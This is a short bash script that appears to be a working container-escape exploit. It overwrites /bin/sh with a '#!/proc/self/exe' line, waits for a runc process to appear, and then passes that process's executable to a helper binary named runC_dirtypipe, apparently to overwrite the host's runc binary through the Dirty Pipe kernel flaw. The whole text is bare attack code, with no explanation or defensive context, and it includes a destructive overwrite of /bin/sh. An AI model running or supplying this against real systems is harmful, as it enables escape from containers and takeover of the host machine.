#!/bin/bash


echo '#!/proc/self/exe' > /bin/sh

while 
    runc_tuple=$(ps ea | sed -n "/\/proc\/self\/exe/Ip")
    [ -z "$runc_tuple" ] 
do :; done

echo $runc_tuple

runc_pid=$(echo $runc_tuple | cut -d " " -f 1)

./runC_dirtypipe /proc/$runc_pid/exe



